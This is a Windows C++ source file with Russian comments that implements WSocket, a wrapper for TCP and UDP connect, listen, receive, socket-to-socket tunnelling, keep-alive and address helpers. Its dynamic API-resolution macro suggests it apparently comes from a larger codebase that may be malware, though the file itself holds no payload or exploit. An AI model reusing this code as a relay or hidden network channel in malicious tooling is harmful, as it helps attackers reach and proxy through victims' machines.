#include <windows.h>
#include <shlwapi.h>
#include <ws2tcpip.h>
#include <mstcpip.h>

#include "wsocket.h"

#define SIZEOF_SOCKADDR(family) ((family) == AF_INET ? sizeof(SOCKADDR_IN) : sizeof(SOCKADDR_IN6))

bool WSocket::init(void)
{
  WSADATA WSAData;
  return CWA(ws2_32, WSAStartup)(MAKEWORD(2, 2), &WSAData) == 0 ? true : false;
}

void WSocket::uninit(void)
{
  CWA(ws2_32, WSACleanup)();
}

bool WSocket::_fdIsSet(SOCKET s, fd_set *pfs)
{
  for(register u_int i = 0; i < pfs->fd_count; i++)if(pfs->fd_array[i] == s)return true;
  return false;
}

int WSocket::tcpRecv(SOCKET s, void *buf, int bufSize, DWORD timeout)
{
  if(timeout > 0)
  {
    timeval tv;
    
    if(timeout != INFINITE)
    {
      tv.tv_sec  = timeout / 1000;
      tv.tv_usec = (timeout % 1000) * 1000;
    }

    fd_set fdsr;
    fdsr.fd_count    = 1;
    fdsr.fd_array[0] = s;

    if(CWA(ws2_32, select)(0, &fdsr, NULL, NULL, timeout == INFINITE ? NULL : &tv) != 1)return SOCKET_ERROR;
  }

  return CWA(ws2_32, recv)(s, (char *)buf, bufSize, 0);
}

bool WSocket::tcpRecvAll(SOCKET s, void *buf, int bufSize, DWORD timeout)
{
  int len;

  do
  {
    if((len = tcpRecv(s, buf, bufSize, timeout)) <= 0)return false;

    buf      = ((LPBYTE)buf) + len;
    bufSize -= len;
  }
  while(bufSize > 0);

  return (bufSize == 0);
}

bool WSocket::tcpRecvAllToNull(SOCKET s, int size, DWORD timeout)
{
  BYTE c;
  while(size--)if(!tcpRecvAll(s, &c, sizeof(BYTE), timeout))return false;
  return true;
}

bool WSocket::tcpSend(SOCKET s, const void *buf, int bufSize)
{
  return (CWA(ws2_32, send)(s, (char *)buf, bufSize, 0) == bufSize) ? true : false;
}

SOCKET WSocket::tcpConnect(const SOCKADDR_STORAGE *sockAddr)
{
  SOCKET s = CWA(ws2_32, socket)(sockAddr->ss_family, SOCK_STREAM, IPPROTO_TCP);
  if(s != INVALID_SOCKET)
  {
    if(CWA(ws2_32, connect)(s, (sockaddr *)sockAddr, SIZEOF_SOCKADDR(sockAddr->ss_family)) != 0)
    {
      CWA(ws2_32, closesocket)(s);
      s = INVALID_SOCKET;
    }
  }
  return s;
}

SOCKET WSocket::tcpConnectA(const LPSTR host, const WORD port)
{
  WORD tcpPort = SWAP_WORD(port);

  //Получаем данные удаленного сервера.
  SOCKADDR_STORAGE *destAddrIpv4 = NULL;
  SOCKADDR_STORAGE *destAddrIpv6 = NULL;

  {
    struct addrinfo *aiList;
    if(CWA(ws2_32, getaddrinfo)(host, NULL, NULL, &aiList) != 0)return INVALID_SOCKET;

    struct addrinfo *cur = aiList;
    while(cur)
    {
      if(cur->ai_family == AF_INET)destAddrIpv4 = (SOCKADDR_STORAGE *)Mem::copyEx(cur->ai_addr, cur->ai_addrlen);
      else if(cur->ai_family == AF_INET6)destAddrIpv6 = (SOCKADDR_STORAGE *)Mem::copyEx(cur->ai_addr, cur->ai_addrlen);
      cur = cur->ai_next;
    }

    CWA(ws2_32, freeaddrinfo)(aiList);
  }

  SOCKET s = INVALID_SOCKET;

  //FIXME: поменять приоретет, когда IPv6 станет порулярнее IPv4.
  if(destAddrIpv4 != NULL)
  {
    ((SOCKADDR_IN *)destAddrIpv4)->sin_port = tcpPort;
    s = tcpConnect(destAddrIpv4);
  }

  //Хз на сколько это логично в релаьных условиях.
  if(destAddrIpv6 != NULL && s == INVALID_SOCKET)
  {
    ((SOCKADDR_IN6 *)destAddrIpv6)->sin6_port = tcpPort;
    s = tcpConnect(destAddrIpv6);
  }

  Mem::free(destAddrIpv4);
  Mem::free(destAddrIpv6);

  return s;
}

SOCKET WSocket::tcpListen(const SOCKADDR_STORAGE *sockAddr, int backlog)
{
  SOCKET s = CWA(ws2_32, socket)(sockAddr->ss_family, SOCK_STREAM, IPPROTO_TCP);
  if(s != INVALID_SOCKET)
  {
    if(CWA(ws2_32, bind)(s, (sockaddr *)sockAddr, SIZEOF_SOCKADDR(sockAddr->ss_family)) != 0 || CWA(ws2_32, listen)(s, backlog) != 0)
    {
      CWA(ws2_32, closesocket)(s);
      s = INVALID_SOCKET;
    }
  }
  return s;
}

SOCKET WSocket::tcpListenRandom(int family, int backlog, WORD portMin, WORD portMax)
{
  if((family == AF_INET || family == AF_INET6) && portMin < portMax)
  {
    SOCKADDR_STORAGE sockAddr;
    Mem::_zero(&sockAddr, sizeof(SOCKADDR_STORAGE));
    sockAddr.ss_family = family;

    for(int i = portMax; i > 0; i--)
    {
      register WORD port = portMin + (Crypt::mtRand() % (portMax - portMin + 1));
      ((SOCKADDR_IN *)&sockAddr)->sin_port = SWAP_WORD(port);
      SOCKET s = tcpListen(&sockAddr, backlog);
      if(s != INVALID_SOCKET)return s;
    }
  }
  return INVALID_SOCKET;
}

SOCKET WSocket::tcpListenEx(int family, WORD port, int backlog)
{
  if((family == AF_INET || family == AF_INET6))
  {
    SOCKADDR_STORAGE sockAddr;
    Mem::_zero(&sockAddr, sizeof(SOCKADDR_STORAGE));
    sockAddr.ss_family = family;
    ((SOCKADDR_IN *)&sockAddr)->sin_port = SWAP_WORD(port);
    return tcpListen(&sockAddr, backlog);
  }
  return INVALID_SOCKET;
}

void WSocket::tcpTunnel(SOCKET s1, SOCKET s2)
{
  int dw;
  fd_set fdsr;
  BYTE buf[1024];

  for(;;)
  {
    fdsr.fd_count = 2;
    fdsr.fd_array[0] = s1;
    fdsr.fd_array[1] = s2;

    if(CWA(ws2_32, select)(0, &fdsr, NULL, NULL, NULL) < 1)goto END;

    for(u_int i = 0; i < fdsr.fd_count; i++)
    {
      SOCKET r = fdsr.fd_array[i];
      SOCKET w = (r == s1 ? s2 : s1);
      if((dw = CWA(ws2_32, recv)(r, (char *)buf, sizeof(buf), 0)) < 1 || CWA(ws2_32, send)(w, (char *)buf, dw, 0) != dw)goto END;
    }
  }
END:;
}

void WSocket::tcpTunnelAndWaitForWinEvent(SOCKET s1, SOCKET s2, HANDLE eventHandle)
{
  struct timeval tv;
  tv.tv_sec  = 0;
  tv.tv_usec = (100 % 1000) * 1000;

  int dw, r;
  fd_set fdsr;
  BYTE buf[1024];

  for(;;)
  {
    fdsr.fd_count = 2;
    fdsr.fd_array[0] = s1;
    fdsr.fd_array[1] = s2;

    //FIXME: WSAEventSelect
    r = CWA(ws2_32, select)(0, &fdsr, NULL, NULL, &tv);
    if(r == SOCKET_ERROR || (eventHandle != NULL && CWA(kernel32, WaitForSingleObject)(eventHandle, 0) != WAIT_TIMEOUT))goto END;

    if(r > 0)for(u_int i = 0; i < fdsr.fd_count; i++)
    {
      SOCKET r = fdsr.fd_array[i];
      SOCKET w = (r == s1 ? s2 : s1);
      if((dw = CWA(ws2_32, recv)(r, (char *)buf, sizeof(buf), 0)) < 1 || CWA(ws2_32, send)(w, (char *)buf, dw, 0) != dw)goto END;
    }
  }
END:;
}

SOCKET WSocket::tcpWaitForEvent(const SOCKET *sockets, DWORD socketsCount, DWORD timeout, const SOCKET *advSockets, DWORD advSocketsCount)
{
  if(socketsCount + advSocketsCount >= FD_SETSIZE)return INVALID_SOCKET;
  struct timeval tv;

  if(timeout > 0)
  {
    tv.tv_sec  = timeout / 1000;
    tv.tv_usec = (timeout % 1000) * 1000;
  }

  fd_set fdsr;
  fdsr.fd_count    = socketsCount + advSocketsCount;
  Mem::_copy(fdsr.fd_array, sockets, sizeof(SOCKET) * socketsCount);
  if(advSocketsCount > 0)Mem::_copy(fdsr.fd_array + socketsCount, advSockets, sizeof(SOCKET) * advSocketsCount);

  int r = CWA(ws2_32, select)(0, &fdsr, NULL, NULL, timeout > 0 ? &tv : NULL);

  if(r == 0)CWA(ws2_32, WSASetLastError)(WSAETIMEDOUT);
  else if(r != INVALID_SOCKET)for(register DWORD i = 0; i < socketsCount; i++)if(_fdIsSet(sockets[i], &fdsr))return sockets[i];
  return INVALID_SOCKET;
}

SOCKET WSocket::tcpWaitForIncomingAndAccept(SOCKET *sockets, DWORD socketsCount, DWORD timeout, SOCKADDR_STORAGE *sockAddr, LPDWORD index, SOCKET *advSockets, DWORD advSocketsCount)
{
  SOCKET s = tcpWaitForEvent(sockets, socketsCount, timeout, advSockets, advSocketsCount);
  if(s != INVALID_SOCKET)
  {
    if(index != NULL)
    {
      DWORD i = 0;
      for(; i < socketsCount; i++)if(sockets[i] == s)
      {
        *index = i;
        break;
      }

      //А вдруг...
      if(i == socketsCount)
      {
        CWA(ws2_32, WSASetLastError)(WSA_INVALID_HANDLE);
        return INVALID_SOCKET;
      }
    }
    int addrLen = sizeof(SOCKADDR_STORAGE);
    s = CWA(ws2_32, accept)(s, (sockaddr *)sockAddr, &addrLen);
  }
  return s;
}

void WSocket::tcpClose(SOCKET s)
{
  if(s != INVALID_SOCKET)
  {
    CWA(ws2_32, shutdown)(s, SD_BOTH);
    CWA(ws2_32, closesocket)(s);
  }
}

struct tcpKeepAlive
{
  u_long  onoff;
  u_long  keepalivetime;
  u_long  keepaliveinterval;
};

bool WSocket::tcpSetKeepAlive(SOCKET s, bool enable, DWORD time, DWORD interval)
{
  tcpKeepAlive ka;
  ka.onoff             = enable;
  ka.keepalivetime     = time;
  ka.keepaliveinterval = interval;

  DWORD retBytes;
  return (CWA(ws2_32, WSAIoctl)(s, SIO_KEEPALIVE_VALS, &ka, sizeof(tcpKeepAlive), NULL, 0, &retBytes, NULL, NULL) == 0);
}

bool WSocket::tcpDisableDelay(SOCKET s, bool disable)
{
  BOOL stat = disable == true ? TRUE : FALSE;
  return (CWA(ws2_32, setsockopt)(s, IPPROTO_TCP, TCP_NODELAY, (char *)&stat, sizeof(BOOL)) == 0);
}

bool WSocket::setNonBlockingMode(SOCKET s, bool enable)
{
  u_long arg = enable ? 1 : 0;
  DWORD retBytes;
  return (CWA(ws2_32, WSAIoctl)(s, FIONBIO, &arg, sizeof(u_long), NULL, 0, &retBytes, NULL, NULL) == 0);
}

SOCKET WSocket::udpListen(const SOCKADDR_STORAGE *sockAddr)
{
  SOCKET s = CWA(ws2_32, socket)(sockAddr->ss_family, SOCK_DGRAM, IPPROTO_UDP);
  if(s != INVALID_SOCKET)
  {
    if(CWA(ws2_32, bind)(s, (sockaddr *)sockAddr, SIZEOF_SOCKADDR(sockAddr->ss_family)) != 0)
    {
      CWA(ws2_32, closesocket)(s);
      s = INVALID_SOCKET;
    }
  }
  return s;
}

void WSocket::udpClose(SOCKET s)
{
  tcpClose(s);
}

bool WSocket::ipToStringW(const SOCKADDR_STORAGE *sockAddr, LPWSTR buffer)
{
  DWORD size = MAX_PATH;
  if(CWA(ws2_32, WSAAddressToStringW)((LPSOCKADDR)sockAddr, SIZEOF_SOCKADDR(sockAddr->ss_family), NULL, buffer, &size) != 0)
  {
    Str::_CopyW(buffer, L"0:0", 3);
    return false;
  }
  return true;
}

bool WSocket::stringToIpW(SOCKADDR_STORAGE *sockAddr, const LPWSTR string)
{
  int size = sizeof(SOCKADDR_STORAGE);
  if(CWA(ws2_32, WSAStringToAddressW)(string, AF_INET, NULL, (LPSOCKADDR)sockAddr, &size) != 0)
  {
    size = sizeof(SOCKADDR_STORAGE);
    if(CWA(ws2_32, WSAStringToAddressW)(string, AF_INET6, NULL, (LPSOCKADDR)sockAddr, &size) != 0)
    {
      Mem::_zero(sockAddr, sizeof(SOCKADDR_STORAGE));
      return false;
    }
  }
  return true;
}

bool WSocket::_isLocalIp(const SOCKADDR_STORAGE *sockAddr)
{
  if(sockAddr->ss_family == AF_INET)
  {
    SOCKADDR_IN *sa4 = ((SOCKADDR_IN *)sockAddr);

       //RFC 1918
    if((sa4->sin_addr.S_un.S_un_b.s_b1 == 10)                                                                                     //10.0.0.0    - 10.255.255.255  (10/8 prefix)
       || (sa4->sin_addr.S_un.S_un_b.s_b1 == 192 && sa4->sin_addr.S_un.S_un_b.s_b2 == 168)                                        //192.168.0.0 - 192.168.255.255 (192.168/16 prefix)
       || (sa4->sin_addr.S_un.S_un_b.s_b1 == 172 && (sa4->sin_addr.S_un.S_un_b.s_b2 > 15 && sa4->sin_addr.S_un.S_un_b.s_b2 < 32)) //172.16.0.0  - 172.31.255.255  (172.16/12 prefix)
       //RFC 3330
       || (sa4->sin_addr.S_un.S_un_b.s_b1 == 127)
      )return true;

  }
  else if(sockAddr->ss_family == AF_INET6)
  {
    //FXIME: IPv6
    const static WORD localIp[] = {0, 0, 0, 0, 0, 0, 0, 1};
    SOCKADDR_IN6 i6a;
    for(BYTE i = 0; i < 8; i++)i6a.sin6_addr.u.Word[i] = SWAP_WORD(((SOCKADDR_IN6 *)sockAddr)->sin6_addr.u.Word[i]);
    if(Mem::_compare(localIp, &i6a, sizeof(localIp)) == 0)return true;
  }
  return false;
}

SOCKET_ADDRESS_LIST *WSocket::getListOfIpAddresses(int family)
{
  SOCKET_ADDRESS_LIST *buffer = NULL;
  SOCKET s = CWA(ws2_32, socket)(family, SOCK_DGRAM, IPPROTO_IP);

  if(s != INVALID_SOCKET)
  {
    DWORD size;
    SOCKET_ADDRESS_LIST testBuf;
    if(CWA(ws2_32, WSAIoctl)(s, SIO_ADDRESS_LIST_QUERY, NULL, 0, &testBuf, 0, &size, NULL, NULL) == SOCKET_ERROR && CWA(ws2_32, WSAGetLastError)() == WSAEFAULT)
    {
      if((buffer = (SOCKET_ADDRESS_LIST *)Mem::alloc(size)) != NULL)
      {
        if(CWA(ws2_32, WSAIoctl)(s, SIO_ADDRESS_LIST_QUERY, NULL, 0, buffer, size, &size, NULL, NULL) != 0)
        {
          Mem::free(buffer);
          buffer = NULL;
        }
      }
    }
    CWA(ws2_32, closesocket)(s);
  }
  return buffer;
}

USHORT WSocket::getFamily(SOCKET s)
{
  SOCKADDR_STORAGE sockAddr;
  int sockAddrSize = sizeof(SOCKADDR_STORAGE);
  if(CWA(ws2_32, getsockname)(s, (sockaddr *)&sockAddr, &sockAddrSize) == 0)return sockAddr.ss_family;
  return AF_UNSPEC;
}